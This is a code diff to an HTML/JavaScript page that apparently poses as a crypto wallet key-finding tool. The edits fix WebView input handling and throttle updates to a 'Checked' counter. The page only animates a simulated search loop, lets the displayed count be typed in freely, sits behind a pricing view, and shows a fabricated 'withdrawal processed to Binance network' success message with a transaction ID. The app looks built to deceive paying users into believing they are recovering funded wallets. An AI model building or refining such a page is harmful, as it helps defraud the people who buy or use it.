@@ -287,7 +287,9 @@
             padding: 0;
             margin: 0;
             cursor: text; /* Show cursor pointer */
-            user-select: text; /* Allow selection */
+            user-select: text !important; /* Force text selection */
+            -webkit-user-select: text !important; /* Safari/WebView support */
+            pointer-events: auto !important; /* Force clickable */
         }
         .stat-val-input:focus {
             border-bottom: 1px solid var(--accent-gold);
@@ -674,7 +676,8 @@
         <!-- EDITABLE INPUT BOX FOR CHECKED COUNT -->
         <div class="stat-box">
             <span class="stat-label">Checked</span><br>
-            <input type="text" id="totalChecked" class="stat-val-input" value="0" inputmode="decimal" autocomplete="off" spellcheck="false" onchange="checkedCount = parseInt(this.value.replace(/,/g, '')) || 0">
+            <!-- Added onfocus/onblur handlers to pause updates when editing -->
+            <input type="text" id="totalChecked" class="stat-val-input" value="0" inputmode="decimal" autocomplete="off" spellcheck="false" onfocus="inputFocused()" onblur="inputBlurred()">
         </div>
         <div class="stat-box"><span class="stat-label">Found</span><br><span id="totalFound" class="stat-val" style="color:var(--accent-green)">0</span></div>
     </div>
@@ -709,7 +712,7 @@
     <div id="successModal" class="modal">
         <div class="check-circle">✓</div>
         <h2 style="color:var(--accent-green); margin:0; font-weight:800;">Success!</h2>
-        <p style="font-size:14px; margin:15px 0; color:var(--text-muted);">Your withdrawal has been processed to the Binance network.</p>
+        <p style="font-size:14px; margin:15px 0; color:var(--text-muted);">Your withdrawal has been processed to Binance network.</p>
         <div style="background:var(--bg-void); padding:15px; border-radius:8px; font-size:11px; text-align:left; border:1px solid rgba(255,255,255,0.1);">
             <div style="color:var(--text-muted); font-size:10px; margin-bottom:5px;">Transaction ID:</div>
             <div id="txId" style="word-break:break-all; color:var(--accent-gold); font-family: 'Courier New', monospace; margin-top:4px;"></div>
@@ -720,6 +723,7 @@
 <script>
     const KEY_URL = "https://raw.githubusercontent.com/Mining-x/Wallet/refs/heads/main/wmkeys.txt";
     let active = false, checkedCount = 0, foundCount = 0, prices = { ETH: 0, BTC: 0 };
+    let isInputFocused = false; // Track if user is editing
 
     /* --- AUTH & NAVIGATION LOGIC --- */
     function showPricing() { document.getElementById('mainLockView').style.display = 'none'; document.getElementById('pricingView').style.display = 'block'; }
@@ -780,6 +784,30 @@
     }
     setInterval(fetchPrices, 15000); fetchPrices();
 
+    // --- INPUT HANDLERS FOR WEBVIEW COMPATIBILITY ---
+    function inputFocused() {
+        isInputFocused = true;
+    }
+
+    function inputBlurred() {
+        isInputFocused = false;
+        // When user clicks away, update the internal counter to what they typed
+        const inputVal = document.getElementById('totalChecked').value.replace(/,/g, '');
+        checkedCount = parseInt(inputVal) || 0;
+    }
+
+    // --- SEPARATE UI UPDATE LOOP (Throttled) ---
+    // Updates the input value 5 times a second (200ms) instead of 60 times.
+    // This prevents Web2App/WebViews from locking up the input.
+    setInterval(() => {
+        if (!isInputFocused) {
+            const inputEl = document.getElementById('totalChecked');
+            if (inputEl) {
+                inputEl.value = checkedCount.toLocaleString();
+            }
+        }
+    }, 200);
+
     function toggle() { 
         active = !active; 
         // SHORTENED BUTTON TEXT
@@ -792,7 +820,6 @@
             const inputVal = checkedInput.value.replace(/,/g, '');
             checkedCount = parseInt(inputVal) || 0;
             
-            // INPUT IS NEVER LOCKED - IT STAYS EDITABLE
             simulate(); 
         }
     }
@@ -840,11 +867,8 @@
             if(log.childNodes.length > 50) log.removeChild(log.lastChild);
         }
         
-        // UPDATE INPUT VALUE - ONLY IF USER IS NOT TYPING IN IT
-        const countInput = document.getElementById('totalChecked');
-        if (document.activeElement !== countInput) {
-            countInput.value = checkedCount.toLocaleString();
-        }
+        // REMOVED UI UPDATE FROM THIS LOOP to prevent WebView blocking
+        // UI is now handled by setInterval above
         
         document.getElementById('totalFound').innerText = foundCount;
         requestAnimationFrame(simulate);
